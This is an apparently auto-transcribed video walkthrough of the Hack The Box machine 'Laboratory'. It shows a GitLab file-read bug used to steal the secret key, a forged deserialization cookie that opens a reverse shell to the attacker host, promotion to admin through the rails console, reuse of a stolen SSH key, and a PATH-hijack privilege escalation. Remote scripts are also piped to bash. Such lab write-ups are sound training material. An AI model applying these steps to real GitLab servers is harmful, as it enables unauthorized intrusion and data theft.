 what's going on youtube is ipsec we're doing laboratory from hack the box which was a super fun easy box that involved a gitlab instance and two exploits around gitlab i really like the second exploit because it's a deserialization vulnerability showing the importance of your application secrets a lot of web applications will serialize data and send it to the user in the form of a cookie so they don't have to keep track of the whole session state themselves it's easier if they just put it in the web request and they trust that the user can't modify it because they have a secret in their application config that the user never gets access to so they can't modify that piece of the cookie however if there is a lfi vulnerability that allows the user to read that cookie then it gives the user the ability to do a desealization attack and get code execution which we do here the first exploit is really cool against git lab it involves creating an issue with a lfi payload and then moving that issue to a different project and some git lab magic sauce will actually trigger that lfi payload and attach the file so with all that being said let's just jump in as always we're going to start off with the nmap so dash sc for default scripts sv enumerate versions oh a output all formats put in the nmap directory but first we have to create this directory we can call it laboratory and then the ip address of 101010 to 16 and then also i'm going to add the dash v flag so it shows me open ports as it finds it so we don't waste any time just waiting around we do have 80 443 and 22 open the easiest thing is to just look at 22 so let's go and hit this and it looks like it redirects us to laboratory.htb so let's go over to our host file and create that so sudo vi etsy hosts and then we can go create an entry for 10 10 10 216 laboratory.hdb save that refresh the page and we have a certificate error so let's accept this risk and we get this page so we get the laboratory and it's security and development services looking at this identity management secure development crypto services threat hunting red teaming profit enhancement they pretty much do everything and profit enhancement and security they generally don't go hand in hand that's why a lot of companies kind of just ignore it but uh the crypto this has a funny joke they do good crypto like rot 13 and base 64. both are just horrible reversible encryption it's more of encoding instead of encryption but uh ignoring that the main thing i'm looking for on this page is something to indicate like a copyright to see when it was created if it's a wordpress site users so we have the ceo of laboratory is dexter so let's go and start our notes so we have this laboratory folder so i'm going to create a new note 05 enumeration and we're going to come back to this that's going to be where i put nmap and i'm going to do 10-laboratory.htb and i'll say this is http there we go so we got a user so users dexter i'm not going to put dd or anyone because it doesn't show them as part of the group it looks like it's just like a testimonial but this one says ceo of laboratory so we're looking at like anything it looks like photo on splash video converter that's nothing looking at the source code to see if there is like a wordpress like wp dash anywhere joomla any signs of what this is coded in and i don't really see anything so the next thing i'm probably going to do is see if this is just an html page a php what is this server running i check html we get a hit let's try php and php is not found so chances are this can be like a static website we can take a screenshot of this so i'm just going to hit print screen and i use fireshot to do my screenshots to make it nice and clean for me i'm just going to print this and we can put a page here so paste the image and then laboratory.htb there we go so now the next thing to do is probably look back over the nmap scan which now has finished so let's do less and map um laboratory.htb or laboratory.map there we go so let's see we got a host key this is a ubuntu system uh http apache it's running both uh apache the same version uh this ssl certificate has an alternate name get.laboratory.htb so this looks like what we want to be going with so i'm going to uh cap this end map and we'll do x clip dash selection clipboard so that put it in my clipboard so now we go to this enumeration tab and map and we can put this so we have the notes and we want to highlight um let's see this and the other important thing in this was the banner so we can kind of come back to clean that up but those are the two key pieces of information we got from this is it's a ubuntu machine and there is a new dns entry so let's go sudo vi etsy hosts and we'll add the get there save this and then go back to firefox then we just go over to the get.laboratory.htb and we'll see what we have let's accept this certificate and it's running get lab the community edition uh gitlab itself if you try to install it it will auto generate a password for you and then when you log in force you to change it so chances are you won't find default passwords like admin admin admin password things like that but git lab is one of those host yourself repos so generally i like just registering and seeing what type of projects are available to me so i can just register those are doing this and we'll put the password of password to see if it lets us do a weak password and email domain is not authorized for signup uh let's try the host of this box so let's see laboratory.htb uh password of password and we can log in so let's go over to projects and doesn't look like we have any let's see more activity can we see activity of other people team [Music] let's see let's go to my user profile let's see slash user slash one i forget exactly how to enumerate users in get lab let's see create a project public projects doesn't look like there's any so the next thing i probably would do is look at the version that's running generally if you ever go to help or about things like that tell you the version so i'm going to look at this release date so i'm going to do gitlab 1281 release date and we see february 24th 2020. so over a full year ago so let's look for vulnerabilities against this vulnerability sure we have a metasploit thing looks like a python hacking script let's see uh there is a hacka1 article let's see what this is i was generally looking for like a blog post that would explain what the vulnerability is because it wouldn't really help us if we just go to google and click the metasploit and run this or like run this python script then just give an ip and opponent like we don't really learn anything from that so that's why i'm kind of avoiding that so we can see let's see this is a file read when moving and issuing the uploads reader does not validate file name allowing arbitrary files to be copied so it looks like it's got a markdown pattern and it's looking first uploads slash looks like 32 hexadecimal characters slash file and it's used by uploads rewriter and that copies a file so steps to reproduce create a project to create two projects add an issue with the following description and move the issue so again screen the issue uploads and then all these ones this is probably going to be 32 ones so let's do echo dash n wc-c earth 32 yeah 32 ones and that fits um this it's got to be the secret 32 hexadecimal characters okay and then file so let's try this let's go here let's go to our gitlab projects your projects create one we're going to call this one please create the project and then let's create another project new project we'll call this one subscribe my firefox froze looks like my whole vm froze uh i'm not sure what happened there but everything seems to have calmed down we're at the new project so now we can call this one subscribe uh create the project please don't crash on me firefox okay so now we have two projects and it wanted us to create an issue on one so let's go here is this issue uh select a project to create a new issue please new issue and please yep and we create that test issue one so we have created this issue we submit it and if we try to view this file it just says not found however apparently when moving this issue it's going to go and pull this file and copy it so let's try that so let's do move issue we'll move it to the subscribe which you should have already done that now and we magically get this passwd awesome so we have successfully viewed this file and this gitlab is a rails project and the next piece of rails is generally the cookies have some type of serialization in them i think this one is it let's copy this we're going to have to decode this so cyber chef so go here we can put this input in we want to do from url so d urld code and then from base64 and that's not exactly what i was expecting that's not a serialized object at all let's go back to this so if we scroll down we can see they got like uh one thousand dollars on triage for that overall this project got this vulnerability was twenty thousand dollars for this finding it but later on i think they chain it in this request so they're grabbing the secret key from this uh get lab yaml file and creating a serialization payload around it and then curling it and this gets rce so a lot of ruby apps even like just applications in general it comes to net too we'll do some type of serialization in cookies and just have it protected based upon a secret key in the application that should never be disclosed however if you ever do read that key you can do some type of deserialization attack so that's we're going to try doing here but first we have to create this issue so let's go back to issues and we're going to create a new issue and this is going to say give me your secret key and then i'm just going to paste where i have there we'll scroll up to grab the payload so let's paste this in and then instead of etsy passwd we want this secrets file so we're going to paste that and i can zoom in so you guys can see this so we submit and let's move the key so move issue to the please i guess i guess i created this in subscribe doesn't really matter but we get secrets.yaml so we can open this and i don't know how to make this text bigger but we got the secret key right here so we should probably take some notes so let's do new note we'll call this 15 get lab and then let's see gitlab.laboratory.htb and we can say version von and secret key so if we just go here we can paste this hack of one article and then take a screenshot of what we have so let's go here like that fireshot screen paste there we go and if we go to get lab help like this we can screenshot this to show the version and if we actually wanted to we can say text and then click where we want it and say released february 2020. if you want to make the font bigger you can and then we can also put a box around it i'm holding ctrl and using the scroll wheel to change the size and when i do that you can see like in the upper left it changes but now we have that screenshot go back to obsidian and paste it we can say version 1281 okay uh secret key we just want to grab this and put it so now the next thing to do in order to i guess it's just wrapping version secret key okay so we have that four notes the next thing we have to do is build git lab yourself because it's giving us a payload to create the serialized object and we just gotta build gitlab so we can do this and also we put the reverse shell here because that's where they're just doing echo the easiest way to build projects if you want specific versions is generally going to be docker so we can search docker hub for get lab and see what comes up there is one gitlab gitlab dash ce and if we go to this let's see do they show tags i don't see oh tags here sweet so we can get specific versions right so if we do a docker pull get lab slash get lab dash ce that is the project get lab get lab ce and we want the version dash ce.0 so a version so let's do 12.8.1 is it dash was the tag ce.0. uh ce is community edition probably and i'm going to do sudo because my user is not in the docker group and it looks like i already have this image so it would have downloaded this image if you didn't have it but looks like i do so after we have the image the next thing we can do is a docker run so we can do sudo docker run and that's going to start this docker container up it's probably going to take a few minutes for it to run so i'm just going to pause the video until it is complete so our get lab container is started so i can do sudo docker ps to get the running containers and we can do sudo docker exact dash i t for image name i think or image i don't know what i t stands for i just know it gets me into the dockers i want so i'm just gonna do five eight that's part of this and we can say bash and now we're in this container and from in this container we can do or get lab commands so we can now craft the cookie the thing we have to do is change the docker secret so i'm going to go back to this and we have the rails config so i'm going to edit this file so let's do vi edit this file go to secret key and we're going to replace that with the key that we pulled so i'm going to copy paste save it and then we just need to restart git lab so get lab dash ctl restart and it's going to go restart all the services and hopefully it doesn't kill my docker process because um doco runs a program until that program dies and then docker itself shuts down so it doesn't look like my container died so that's not an issue here get lab dash rails console and this is going to get us into the interactive ruby console for git lab where we can now just call like specific code it's going to take a little bit to run like if you ever use like msf venom or metasploit also ruby projects anytime you execute ruby it just seems to take like 30 seconds but i can see my processor is chugging along here and it's not loaded until it says irb so now that we're in this shell we can go back to this page and we just want to copy this payload so i'm going to copy this let's go to obsidian notes and we'll get the dcli's payload type it here and does not look like it did line breaks uh let's see if i click copy will that copy it better there we go because we want to replace this with the reverse shell so i'll do bash dash c then bash dash i like that dev tcp 10 10 14 3 is my ip address 0 at and 1. so we now have this and i can call this ruby code so if we look at what it looks like looks pretty so we can copy paste it uh yeah that looks fine and now we got this payload so we can go back to obsidian and we can do that 10 10 14 3 9 000 1. there we go i'm just doing this to save exactly what this payload actually does so if we now go here it says do this curl so i'm going to copy this let's do nc lvmp 9001 paste and then we can paste this new payload hit enter and of course we have to change the hostname so this will be get that laboratory dot htb and 302 found because we did not do https maybe and now we have to add dash k to accept the ssl certificate and it doesn't look like it worked let's see girl https user sign in dash b oh we don't have what it equals i only copied here we have to copy this experimental id thing so copy that there we go and we get a reverse shell and what i'm going to do is i'm going to go up here so we can highlight this so let's go print screen and then we can go like this copy and paste there we go so now we're on the gitlab box and i'm going to create a new pane i'm going to send this to the new pane so we can just work off of this and we should get a proper tty so python3 dash c import pty pty dot spawn bend bash okay then control z stty raw minus echo f g enter enter and now we're on this box we can export term is equal to x term so now i can clear the screen so let's go and do an ipaddr or ifconfig none of those are found during lsla on slash and we are indeed inside of a docker environment so we're running as get on the docker environment so the very first thing i want to do is run a tool called deepsea so deep then ce this is a like docker enumeration script so if we look here has a way to download it so we can just w get it so let's go make third www go here wget deepsea python3 dash m http server and now we can curl 10 10 14 3 port 8000 dot sh pipe it over to bash and it's gonna run a docker enumeration script for us which is super handy so it's doing exploit tests uh it's just like land and um where we're not lin noom um lin p's where it highlights everything that we should look at so we're inside a container found that out gives us a user uh we don't know the docker version so it doesn't give us any exploits we don't have a docker socket or executable we got this container id can't get reverse name ip dns uh doesn't really have anything we're not in privilege mode no docker sock mount we do have some server mounts this is good to know so on the host we have these mounts mounted over top of this string file slash release so it doesn't look like we really have anything uh do we have netstat uh no so the next step to do would be try to get root on this container then we can kind of run this again or just find a way off the container um we do have git lab and generally the first step whenever i want to do privacy is i enumerate the application that's installed on the machine in this case it's get lab so i'm just gonna do get lab dash rails console and then in order to learn these console commands i just do get lab rails console cheat sheet and there's a bunch of good things here so if you go here they have a little troubleshooting thing this is how like an admin would do a password reset things like that but if we can find users we can like dump the user list crack things and try to reuse a password things like that um we gotta wait until it says irb just like the last time but this one will do find users pp is pretty print so it prints all the users attributes and this will get like the password um there's also like an is admin tribute so we can just make ourselves an admin so we don't have to do any password cracking to become an admin and we can look around there because there may be projects on the server that we just don't have access to as a public user but if we're admin we could grant ourselves access to that project but right now we're just waiting to get the irb console so now we're here we can now do a what is it um user dot find one and that's dexter if we do user find two i couldn't find user id with two three is ghost four is seven five is me and then nothing so if we wanted to we could say u is equal to user dot find and one and this is going to get us dexter and then if we do was it pretty print u dot attributes we get a list of all his attributes and if we wanted to we could try now cracking the password where is it right here so you grab this and then we could also do the same thing with like four whoever four was seven and try cracking their password um we can do find by username so if i do this and we're just going to do ip so now if i do this pretty print yet again we can see me but there should be a admin token let's see admin admin is false so if we just set this to true then we will be able admin on the um ruby app so i'm going to do u dot admin is equal to true and then u dot save so now we just save this to the database and if i go back to git lab uh we may have to log out and log in so i'm just gonna go home oh nope we got admin area right here so now we can go let's look at projects and we got two projects from dexter i want this really dexter's last name in dexter's laboratory um let's see dexter's laboratory last name of dexter it is mcpherson cool so let's see how do we view his projects what if we just go to uh gitlab dexter and we have two projects secure docker and secure website and now we can view these because we are admin and let's see creategitlab.sh to do.txt what is this uh docker for regular users nothing interesting there other than the like band dd from uh docker we got an id rsa so this looks like an ssh key so i'm going to open this raw and we will just download this ssh key and we should take a screenshot of this whoops there we go screenshot copy let's go to obsidian new 20 uh actually we just added here sh key there we go let's see do i already get rid of this uh we probably should have taken notes on uh this so we can say u is equal to user.find or is it find underscore by username i am out of the search let's see up up up up find there we go so we want to copy this there u dot admin is equal to true u dot save so now we have nodes for um changing ourselves to admin there we go okay so let's go back to that ssh key so v ssh we'll call this dexter.key and then go back here copy say paste chmod 600 dextre.key sh i dexter.key 101010 216. yes and we probably have to specify our username i'm going to try dexter because that's whose name it is and we got in if this didn't work i'd probably try like um d dot mcpherson d mcpherson mcpherson just a bunch of names around this user to try to guess it and then if that didn't work i would go back through this and see if anything was leaked like maybe the secure website maybe this would have something uh maybe credits.txt nope that's just where they got the website from but there'd probably be something around here to hint at a username um also if we like logged in to dexter we could potentially get his username here but yeah so now we're on this the next step we'll probably do len p's so let's go in the www directory and copy up uh privilege escalation awesome script what is it there we go and then lynn p's linps.sh curl 10 10 10 or 10 10 14 3 port 8 000 lynn ps.sh divided bash and let's run this it can take probably a minute or two to run so i'm just going to pause the video and we'll resume when it's done linps is done so let's go over the results i'm just going to search for coral 1010 so we can go to the very beginning and we can take a look at this uh the operating system ubuntu 20 studio version 1.831 i'm pretty sure this is patched um i don't know why it's red here in lynn p's but i think we just went over this in a previous video so just going through this to see if there's anything interesting and stopping whenever i see red this is vmware i don't know why this is in red for a disk root processes looks like there is a lot and this is maybe we should have done like something that didn't do line breaks because now this is getting messy now that it's like printed like this tons and tons of things running lxd oddly enough is running my reverse shell right here maybe gitlab is running in lxd and not wait no it was running docker not exactly sure what's going on here we can check our groups because we may be a part of the lxd group which then we can create a linux machine and give it the ability to mount the root disk and priv-esque that way if you haven't seen that it's been done a few times if you go to ipsec.rocks type lxd sure you'll find it if not i remember doing that in calamity so looking at other things interfaces networks users nothing really found login now software information see uncommon past wd container interesting files i hate snap i really hate like just put so many things in a set uid like part of me wishes like i could just remove snap from this output mount f mount key sign uh this one's interesting so this is owned by dexter which is our user and it's in local and local is a directory where like package managers should not touch so this is probably what i want to start with so let's take this binary let's go to execute it see what happens nothing okay let's try strings uh strings not found we can hex dump it real quick see if we see anything interesting chmod commands and that's not a full path so let's see if we actually trigger that so if we do l trace do we have l trace on this box we do l trace on this and we can see it doing system with that chmod command we did and it's called set uid and gid so uh one of the good things about sudo is it has a concept of secure path and path is like how your system or execute binaries set id set uid binaries which we'll execute as root don't really have a secure path concept so it just executing chmod after doing this set uid and gid to zero to go to root privilege um it's just gonna go into a path and execute one by one these directories looking for a ch mod so we put chmod up front then we're gonna execute our own binary so i'm gonna do vi ch mod we can do the shebang bin bash and then we'll just call bash and then i'll do ch mod plus x ch mod that's dirty um so if we execute chmod it executes bash and we're in that shell so what we want to do now is echo path and we'll do export path is equal to our current working directory uh pwd and then colon path so now if i echo path again we have our working directory here and if i run chmod it's going to pull the ch mod out of this directory so now when i execute this docker security thing we are now root so we can go cd slash root and grab root.text so uh yeah um i guess we should i'll trace this binary real quick exit uh let's see mv chmod to ch mod 2 and we can i'll trace this for our notes and wrap it up so we'll do here docker security um relative path dash like that and then just say um by adding the path we can force this set uid binary to okay so let's go over this real quick we got nmap where we um got all the services we can look at what this looks like this looks fine i'm happy with this looking at http we went to the web page we found a potential user dexter uh we probably should have done something with the screenshot to show where we got that from because right now that kind of just stands out so since i don't want to go and edit the screenshot we can say client testimonials includes one from the ceo there we go uh git lab so looking at this we found it version 1281 which was released february 2020 we created the vulnerability to copy the secrets file and then we took the secret key and built this dcli payload out of it and there's our code we changed our user to become admin we could go here and also say things like viewing or grabbing hashes of other users things like that and then for the we did docker security so that'll be the video hope you guys enjoyed it take care and i'll see you all next week